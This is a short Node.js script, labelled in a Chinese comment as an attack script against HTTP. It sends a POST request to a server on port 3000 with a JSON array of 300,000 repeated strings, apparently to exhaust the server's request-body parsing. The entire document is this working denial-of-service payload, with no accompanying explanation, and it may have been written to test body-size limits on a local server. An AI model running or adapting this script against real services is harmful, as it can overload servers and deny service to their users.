var http = require('http');
//对HTTP的攻击脚本
var req = http.request({
	method: 'POST',
	port: 3000,
	headers: {
		'Content-Type': 'application/json'
	}
});

req.write('[');
var n = 300000;
while (n--) {
	req.write('"foo",');
}
req.write('"bar"]');

req.end();